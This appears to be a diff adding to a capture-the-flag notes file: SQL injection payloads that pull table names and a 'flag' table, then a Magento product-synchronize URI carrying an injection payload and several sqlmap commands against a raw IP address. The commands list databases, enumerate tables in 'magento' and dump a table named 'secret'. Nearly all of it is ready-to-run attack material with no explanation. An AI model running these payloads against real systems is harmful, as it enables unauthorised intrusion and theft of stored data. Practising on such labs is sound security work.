@@ -221,3 +221,31 @@ admin/t/collection/?detail__a%27
 1’ && '1'='1' union select 1,2,3,4,5,6,7,8;-- #
 1' && '1'='0' union SELECT  1,2,3,4,5,6,group_concat(table_name),8 from sys.schema_table_statistics ;-- #
 1' && '1'='0' union/* */SELECT 1,2,(select `1` from (select 1 union/* */SELECT * from flag)secplayground limit 1,1),4,5,6,7,8 ;-- #
+====================
+
+uri => /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-
+
+sqlmap -u 'http://35.240.215.19/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=' \
+--threads 10 -p "ids[0][product_id][to]" --prefix=")))" \
+--suffix=" -- -" --dbms=mysql --ignore-code=400 \
+--level=5 --risk=3 --batch -o --current-db --random-agent
+
+sqlmap -u 'http://35.240.215.19/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=' \
+--threads 10 -p "ids[0][product_id][to]" --prefix=")))" \
+--suffix=" -- -" --dbms=mysql --ignore-code=400 \
+--level=5 --risk=3 --batch -o --current-db
+
+sqlmap -u 'http://35.240.215.19/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=' \
+--threads 10 -p "ids[0][product_id][to]" --prefix=")))" \
+--suffix=" -- -" --dbms=mysql --ignore-code=400 \
+--level=5 --risk=3  --batch --dbs'
+
+sqlmap -u 'http://35.240.215.19/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=' \
+--threads 10 -p "ids[0][product_id][to]" --prefix=")))" \
+--suffix=" -- -" --dbms=mysql --ignore-code=400 \
+--level=5 --risk=3 --technique -T --batch -D magento --tables
+
+sqlmap -u 'http://35.240.215.19/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=' \
+--threads 10 -p "ids[0][product_id][to]" --prefix=")))" \
+--suffix=" -- -" --dbms=mysql --ignore-code=400 \
+--level=5 --risk=3 --technique=T --batch -D magento -T secret --dump
